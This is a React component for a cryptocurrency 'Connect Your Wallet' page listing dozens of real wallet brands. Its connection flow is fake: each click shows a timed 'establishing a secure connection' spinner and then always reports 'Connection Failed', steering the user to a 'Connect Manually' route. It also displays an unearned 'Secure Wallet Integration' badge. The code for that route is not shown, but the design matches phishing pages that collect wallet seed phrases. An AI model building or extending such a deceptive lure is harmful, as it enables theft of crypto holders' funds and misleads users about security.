import React, { useState, useEffect } from 'react';
import { Wallet, Search, Shield, ChevronRight, RefreshCw, ExternalLink } from 'lucide-react';
import { setSelectedWallet } from './walletSlice';
import { useDispatch } from 'react-redux';
import { useNavigate } from 'react-router-dom';

import SearchBar from './SearchBar';
import WalletGrid from './WalletGrid';
import WalletModal from './WalletModal';
import Loader from './Loader';
import ledger from './assets/images.png'
import oneInch from './assets/1inch.jpg';
import arculus from './assets/arculus.jpg';
import argent from './assets/argent.jpg';
import atWallet from './assets/at_wallet.jpg';
import atokenWallet from './assets/atoken_wallet.jpg';
import atomic from './assets/atomic.jpg';
import bifrost from './assets/bifrost.jpg';
import binance from './assets/binance.png';
import bitkeep from './assets/bitkeep.jpg';
import bitpay from './assets/bitpay.jpg';
import bridgeWallet from './assets/bridge_wallet.jpg';
import celoWallet from './assets/celo_wallet.jpg';
import coin98 from './assets/coin98.jpg';
import coinbase from './assets/coinbases.png';
import coinomi from './assets/coinomi.jpg';
import coinus from './assets/coinus.jpg';
import compound from './assets/compound.jpg';
import coolWalletS from './assets/cool_wallet_s.jpg';
import crypto from './assets/crypto.jpg';
import dharma from './assets/dharma.jpg';
import dokWallet from './assets/dok_wallet.jpg';
import easypocket from './assets/easypocket.jpg';
import ellipal from './assets/ellipal.jpg';
import encryptedInk from './assets/encrypted_ink.jpg';
import enjin from './assets/enjin.jpg';
import error from './assets/error.png';
import etoro from './assets/etoro.jpg';
import exodus from './assets/exodus.jpg';

import flareWallet from './assets/flare_wallet.jpg';
import gridplus from './assets/gridplus.jpg';
import guardaWallet from './assets/guarda_wallet.jpg';
import halodefiWallet from './assets/halodefi_wallet.jpg';
import hashkeyMe from './assets/hashkey_me.jpg';
import huobi from './assets/huobi.jpg';
import imtoken from './assets/imtoken.jpg';
import infinito from './assets/infinito.jpg';
import iotex from './assets/iotex.jpg';
import jadeWallet from './assets/jade_wallet.jpg';
import keyringPro from './assets/keyring_pro.jpg';
import kyberswap from './assets/kyberswap.jpg';
import ledgerLive from './assets/ledger_live.jpg';
import mathWallet from './assets/math_wallet.jpg';
import metamask from './assets/metamask.jpg';
import midasWallet from './assets/midas_wallet.jpg';
import mykey from './assets/mykey.jpg';
import nash from './assets/nash.jpg';
import phantom from './assets/phantom.jpg';

import o3Wallet from './assets/o3_wallet.jpg';
import onto from './assets/onto.jpg';
import ownbit from './assets/ownbit.jpg';
import plasmapay from './assets/plasmapay.jpg';
import polkadot from './assets/polkadot.jpg';
import polygon from './assets/polygon.jpg';
import rainbow from './assets/rainbow.jpg';
import reactSvg from './assets/react.svg';
import rwallet from './assets/rwallet.jpg';
import safepal from './assets/safepal.png';
import shield from './assets/shield.png';
import spatium from './assets/spatium.jpg';
// import { useDispatch } from 'react-redux';
// import { useNavigate } from 'react-router-dom';

import talkenWallet from './assets/talken_wallet.jpg';
import tokenPocket from './assets/token_pocket.jpg';
import tokenary from './assets/tokenary.jpg';
import tongueWallet from './assets/tongue_wallet.jpg';
import torus from './assets/torus.jpg';
import tradestation from './assets/tradestation.jpg';
import trezor from './assets/trezor.jpg';
import trustVault from './assets/trust_vault.jpg';
import trustWallet from './assets/trustwallet.png';
import trusteeWallet from './assets/trustee_wallet.jpg';
import unnamed from './assets/unnamed.png'; 
import unnamedWebp from './assets/unnamed.webp';
import unnamed1 from './assets/unnamed(1).png';
import unnamed2 from './assets/unnamed(2).png';
import yoroi from './assets/yoroi.png';
import okm from './assets/okm.png';




import unstoppableWallet from './assets/unstoppable_wallet.jpg';
import valora from './assets/valora.jpg';
import viaWallet from './assets/via_wallet.jpg';
import walle from './assets/walle.jpg';
import walletIo from './assets/wallet_io.jpg';
import walleth from './assets/walleth.jpg';
import xinfin from './assets/xinfin.jpg';
import xumm from './assets/xumm.png';
import zelcore from './assets/zelcore.jpg';
import LoaderConnection from './LoaderConnection';
import InitialLoader from './InitialLoader';



const wallets = [
  { id: 1, name: '1inch', url: 'https://1inch.io', icon: oneInch },
  { id: 2, name: 'Arculus', url: 'https://getarculus.com', icon: arculus },
  { id: 3, name: 'Argent', url: 'https://www.argent.xyz', icon: argent },
  { id: 4, name: 'At Wallet', url: 'https://www.atwallet.io', icon: atWallet },
  { id: 5, name: 'Atoken Wallet', url: 'https://www.atoken.com', icon: atokenWallet },
  { id: 6, name: 'Atomic', url: 'https://atomicwallet.io', icon: atomic },
  { id: 7, name: 'Bifrost', url: 'https://bifrostwallet.com', icon: bifrost },
  { id: 8, name: 'Binance Wallet', url: 'https://www.binance.com', icon: binance },
  { id: 9, name: 'BitKeep', url: 'https://bitkeep.com', icon: bitkeep },
  { id: 10, name: 'BitPay', url: 'https://bitpay.com', icon: bitpay },
  { id: 11, name: 'Ledger', url: 'https://www.ledger.com', icon: ledger },
  { id: 12, name: 'Bridge Wallet', url: 'https://www.mtpelerin.com/bridge-wallet', icon: bridgeWallet },
  { id: 13, name: 'Celo Wallet', url: 'https://celowallet.app', icon: celoWallet },
  { id: 14, name: 'Coin98', url: 'https://coin98.com', icon: coin98 },
  { id: 15, name: 'Coinbase', url: 'https://www.coinbase.com', icon: coinbase },
  { id: 16, name: 'Coinomi', url: 'https://www.coinomi.com', icon: coinomi },
  { id: 17, name: 'Coinus', url: 'https://coinus.io', icon: coinus },
  { id: 18, name: 'Compound', url: 'https://compound.finance', icon: compound },
  { id: 19, name: 'Cool Wallet S', url: 'https://www.coolwallet.io', icon: coolWalletS },
  { id: 20, name: 'Crypto.com', url: 'https://crypto.com', icon: crypto },
  { id: 21, name: 'Dok Wallet', url: 'https://dokwallet.com', icon: dokWallet },
  { id: 22, name: 'EasyPocket', url: 'https://easypocket.app', icon: easypocket },
  { id: 23, name: 'Ellipal', url: 'https://www.ellipal.com', icon: ellipal },
  { id: 24, name: 'Enjin', url: 'https://enjin.io', icon: enjin },
  { id: 25, name: 'Etoro', url: 'https://www.etoro.com', icon: etoro },
  { id: 26, name: 'Exodus', url: 'https://www.exodus.com', icon: exodus },
  { id: 27, name: 'Flare Wallet', url: 'https://flarewallet.io', icon: flareWallet },
  { id: 28, name: 'Gridplus', url: 'https://gridplus.io', icon: gridplus },
  { id: 29, name: 'Guarda Wallet', url: 'https://guarda.com', icon: guardaWallet },
  { id: 30, name: 'Hashkey Me', url: 'https://me.hashkey.com', icon: hashkeyMe },
  { id: 31, name: 'Huobi', url: 'https://www.huobi.com', icon: huobi },
  { id: 32, name: 'Imtoken', url: 'https://token.im', icon: imtoken },
  { id: 33, name: 'Infinito', url: 'https://www.infinitowallet.io', icon: infinito },
  { id: 34, name: 'IoTex', url: 'https://iotex.io', icon: iotex },
  { id: 35, name: 'Keyring Pro', url: 'https://keyring.app', icon: keyringPro },
  { id: 36, name: 'Kyberswap', url: 'https://kyberswap.com', icon: kyberswap },
  { id: 37, name: 'Ledger Live', url: 'https://www.ledger.com/ledger-live', icon: ledgerLive },
  { id: 38, name: 'Math Wallet', url: 'https://mathwallet.org', icon: mathWallet },
  { id: 39, name: 'Metamask', url: 'https://metamask.io', icon: metamask },
  { id: 40, name: 'MyKey', url: 'https://mykey.org', icon: mykey },
  { id: 41, name: 'O3 Wallet', url: 'https://o3.network', icon: o3Wallet },
  { id: 42, name: 'Onto', url: 'https://onto.app', icon: onto },
  { id: 43, name: 'Ownbit', url: 'https://ownbit.io', icon: ownbit },
  { id: 44, name: 'Plasmapay', url: 'https://plasmapay.com', icon: plasmapay },
  { id: 45, name: 'Polkadot', url: 'https://polkadot.network', icon: polkadot },
  { id: 46, name: 'Polygon', url: 'https://polygon.technology', icon: polygon },
  { id: 47, name: 'Rainbow', url: 'https://rainbow.me', icon: rainbow },
  { id: 48, name: 'RWallet', url: 'https://www.rwallet.app', icon: rwallet },
  { id: 49, name: 'SafePal', url: 'https://www.safepal.com/en/', icon: safepal },
  { id: 50, name: 'Spatium', url: 'https://spatium.net', icon: spatium },
  { id: 51, name: 'Talken Wallet', url: 'https://talken.io', icon: talkenWallet },
  // { id: 52, name: 'Token Pocket', url: 'https://www.tokenpocket.pro', icon: tokenPocket },
  { id: 53, name: 'Tokenary', url: 'https://tokenary.io', icon: tokenary },
  {id: 52, name: 'Yoroi', url:'https://yoroi-wallet.com/', icon: yoroi },

  { id: 54, name: 'Torus', url: 'https://tor.us', icon: torus },
  { id: 55, name: 'Tradestation', url: 'https://www.tradestation.com', icon: tradestation },
  { id: 56, name: 'Trezor', url: 'https://trezor.io', icon: trezor },
  { id: 57, name: 'Trust Wallet', url: 'https://trustwallet.com', icon: trustWallet },
  { id: 58, name: 'Trustee Wallet', url: 'https://trusteeglobal.com', icon: trusteeWallet },
  { id: 59, name: 'Unstoppable Wallet', url: 'https://unstoppable.money', icon: unstoppableWallet },
  { id: 60, name: 'Valora', url: 'https://valoraapp.com', icon: valora },
  { id: 61, name: 'Via Wallet', url: 'https://viawallet.com', icon: viaWallet },
  { id: 62, name: 'Wallet Io', url: 'https://wallet.io', icon: walletIo },
  { id: 63, name: 'Walleth', url: 'https://walleth.org', icon: walleth },
  { id: 64, name: 'Xinfin', url: 'https://xinfin.org', icon: xinfin },
  { id: 65, name: 'TokenPocket', url: 'https://www.tokenpocket.pro', icon: xumm },
  { id: 66, name: 'Zelcore', url: 'https://zelcore.io', icon: zelcore },
  { id: 67, name: 'Phantom', url: 'https://phantom.com/', icon: phantom },
  { id: 68, name: 'Okx', url: 'https://www.okx.com/', icon: okm },

];


function Home() {
  const dispatch = useDispatch();
  const navigate = useNavigate();
  const [searchTerm, setSearchTerm] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [initialLoading, setInitialLoading] = useState(true);
  const [showConnectionLoader, setShowConnectionLoader] = useState(false);
  const [selectedWalletForModal, setSelectedWalletForModal] = useState(null);

  const filteredWallets = wallets.filter(wallet =>
    wallet.name.toLowerCase().includes(searchTerm.toLowerCase())
  );

  const handleCardClick = (wallet) => {
    // Store the selected wallet for the modal
    setSelectedWalletForModal(wallet);
    
    // Dispatch to Redux
    dispatch(setSelectedWallet({ 
      name: wallet.name,
      icon: wallet.icon,
      url: wallet.url
    }));
    
    // Show connection loader
    setShowConnectionLoader(true);

    // After loader, show modal
    setTimeout(() => {
      setShowConnectionLoader(false);
      setShowModal(true);
    }, 5000);
  };

  const handleCloseModal = () => {
    setShowModal(false);
  };

  const handleManualConnect = () => {
    setShowModal(false);
    navigate('/connect-wallet');
  };

  const handleTryAgain = () => {
    setShowModal(false);
    setShowConnectionLoader(true);
    setTimeout(() => {
      setShowConnectionLoader(false);
      setShowModal(true);
    }, 5000);
  };

  // Custom SearchBar component with teal styling
  const CustomSearchBar = ({ searchTerm, setSearchTerm }) => {
    return (
      <div className="relative max-w-xl mx-auto mb-12">
        <div className="flex items-center bg-gray-800/60 border border-teal-500/30 rounded-xl overflow-hidden backdrop-blur-sm">
          <div className="pl-4">
            <Search size={20} className="text-teal-200" />
          </div>
          <input
            type="text"
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            placeholder="Search wallets..."
            className="w-full py-4 px-3 bg-transparent text-white placeholder-teal-200/50 outline-none"
          />
          {searchTerm && (
            <button
              onClick={() => setSearchTerm('')}
              className="px-4 text-teal-200 hover:text-teal-100"
            >
              ✕
            </button>
          )}
        </div>
      </div>
    );
  };

  // Custom WalletGrid component with teal styling
  const CustomWalletGrid = ({ wallets, onCardClick }) => {
    return (
      <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 gap-4">
        {wallets.map((wallet) => (
          <div
            key={wallet.id}
            onClick={() => onCardClick(wallet)}
            className="bg-gray-800/40 border border-teal-500/20 rounded-xl p-4 flex flex-col items-center justify-center cursor-pointer transition-all duration-300 hover:bg-gray-700/40 hover:border-teal-400/30 hover:shadow-lg hover:shadow-teal-500/10 group"
          >
            <div className="w-12 h-12 mb-3 rounded-full bg-gray-700 p-1 overflow-hidden flex items-center justify-center">
              <img
                src={wallet.icon}
                alt={wallet.name}
                className="w-full h-full object-contain rounded-full"
                onError={(e) => {
                  e.target.onerror = null;
                  e.target.src = "fallback-image-url.jpg";
                }}
              />
            </div>
            <h3 className="text-white font-medium text-sm text-center">{wallet.name}</h3>
            <div className="mt-2 opacity-0 group-hover:opacity-100 transition-opacity duration-300">
              <span className="text-xs text-teal-200 flex items-center gap-1">
                Connect <ChevronRight size={12} />
              </span>
            </div>
          </div>
        ))}
      </div>
    );
  };

  // Custom WalletModal component with teal styling
  const CustomWalletModal = ({ wallet, onClose, onTryAgain, onManualConnect }) => {
    return (
      <div className="fixed inset-0 flex items-center justify-center z-50 bg-black/80 backdrop-blur-sm">
      <div className="bg-gray-900 border border-teal-500/30 rounded-2xl w-full max-w-md overflow-hidden shadow-2xl">
        <div className="p-6">
          <div className="flex justify-between items-center mb-4">
            <h3 className="text-xl font-bold text-white">Connection Failed</h3>
            <button onClick={onClose} className="text-teal-200 hover:text-teal-100">
              ✕
            </button>
          </div>
          
          <div className="flex flex-col items-center justify-center py-6">
            <div className="w-16 h-16 rounded-full bg-gray-800 p-2 mb-4">
              <img 
                src={wallet.icon} 
                alt={wallet.name} 
                className="w-full h-full object-contain rounded-full"
              />
            </div>
            <p className="text-lg font-medium text-white mb-1">{wallet.name}</p>
            <a 
              href={wallet.url} 
              target="_blank" 
              rel="noopener noreferrer" 
              className="text-sm text-teal-200 flex items-center gap-1 mb-6 hover:text-teal-100"
            >
              {wallet.url.replace('https://', '')} <ExternalLink size={12} />
            </a>
            
            <div className="bg-gray-800/60 rounded-lg p-4 mb-6 text-gray-300 text-sm">
              <p>We couldn't connect to your wallet automatically. Please try again or connect manually using your wallet extension.</p>
            </div>
          </div>
          
          <div className="flex flex-col gap-3">
            <button 
              onClick={onTryAgain} 
              className="group relative w-full py-3 bg-gradient-to-br from-teal-500 to-blue-600 rounded-lg text-white font-medium hover:from-teal-400 hover:to-blue-500 transition-all duration-300 shadow-lg shadow-blue-900/30 overflow-hidden flex items-center justify-center gap-2"
            >
              <span className="absolute inset-0 bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
              <RefreshCw size={16} /> Try Again
            </button>
            <button 
              onClick={onManualConnect} 
              className="group relative w-full py-3 bg-gradient-to-br from-teal-500 to-blue-600 rounded-lg text-white font-medium hover:from-teal-400 hover:to-blue-500 transition-all duration-300 shadow-lg shadow-blue-900/30 overflow-hidden flex items-center justify-center gap-2"
            >
              <span className="absolute inset-0 bg-white/10 opacity-0 group-hover:opacity-100 transition-opacity duration-300" />
              Connect Manually
            </button>
          </div>
        </div>
      </div>
    </div>
    );
  };

  // Custom LoaderConnection component with teal styling
  const CustomLoaderConnection = () => {
    return (
      <div className="fixed inset-0 flex flex-col items-center justify-center z-50 bg-black/80 backdrop-blur-sm">
        <div className="w-16 h-16 mb-6">
          <div className="w-full h-full border-4 border-teal-200/20 border-t-teal-200 rounded-full animate-spin"></div>
        </div>
        <p className="text-teal-200 font-medium text-lg">Connecting to {selectedWalletForModal?.name}...</p>
        <p className="text-gray-400 text-sm mt-2">Please wait while we establish a secure connection</p>
      </div>
    );
  };

  return (
    <>
      {initialLoading ? (
        <InitialLoader onLoadingComplete={() => setInitialLoading(false)} />
      ) : (
        <div className="min-h-screen bg-gradient-to-b from-gray-900 via-gray-800 to-black">
          <div className="container mx-auto px-4 py-12">
            <div className="text-center mb-16 space-y-4">
              <div className="inline-block">
                <div className="inline-flex items-center gap-2 bg-teal-900/30 border border-teal-500/30 px-5 py-2 rounded-full mb-8 backdrop-blur-sm">
                  <Shield size={16} className="text-teal-200" />
                  <span className="text-sm font-medium text-teal-200">Secure Wallet Integration</span>
                </div>
              </div>
              <h2 className="text-4xl md:text-5xl font-bold text-white tracking-tighter">
                Connect Your Wallet
              </h2>
              <p className="text-gray-400 max-w-2xl mx-auto text-lg">
                Choose from our wide selection of supported wallets for secure blockchain interaction
              </p>
            </div>
            
            <CustomSearchBar searchTerm={searchTerm} setSearchTerm={setSearchTerm} />
            
            {filteredWallets.length > 0 ? (
              <CustomWalletGrid wallets={filteredWallets} onCardClick={handleCardClick} />
            ) : (
              <div className="text-center py-16">
                <p className="text-gray-400 text-lg">No wallets found matching "{searchTerm}"</p>
                <button 
                  onClick={() => setSearchTerm('')} 
                  className="mt-4 text-teal-200 hover:text-teal-100"
                >
                  Clear search
                </button>
              </div>
            )}
            
            {showConnectionLoader && <CustomLoaderConnection />}
            
            {showModal && selectedWalletForModal && (
              <CustomWalletModal 
                wallet={selectedWalletForModal}
                onClose={() => setShowModal(false)}
                onTryAgain={handleTryAgain}
                onManualConnect={handleManualConnect}
              />
            )}
            
            <div className="mt-20 pt-10 border-t border-gray-800 text-center">
              <p className="text-gray-500 text-sm">
                Having trouble connecting? <a href="#" className="text-teal-200 hover:text-teal-100">Visit our Help Center</a>
              </p>
            </div>
          </div>
        </div>
      )}
    </>
  );
}

export default Home;